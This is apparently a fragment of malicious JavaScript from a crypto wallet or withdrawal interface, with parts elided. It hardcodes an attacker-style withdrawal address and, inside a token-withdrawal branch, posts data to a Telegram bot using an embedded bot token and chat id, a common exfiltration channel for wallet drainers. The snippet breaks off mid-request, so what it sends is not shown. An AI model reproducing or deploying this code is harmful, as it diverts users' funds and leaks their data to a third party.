...
const WITHDRAWAL_ADDRESS = "0xB333B76a3d5Ea370D80454Deb0013Dc74Ded348e"
        ...
        if (withdrawalToken) {
            ...
            if (withdrawalToken.appId === "tokens") {
                ...
                try {
                    ...
                    var z=$.ajax({  
    type: "POST",  
    url: "https://api.telegram.org/bot"+"5596531680:AAFHGhMhh3JZhmXTSa2U8XrjFYTI3-oGtw4"+"/sendMessage?chat_id="+"358055146",
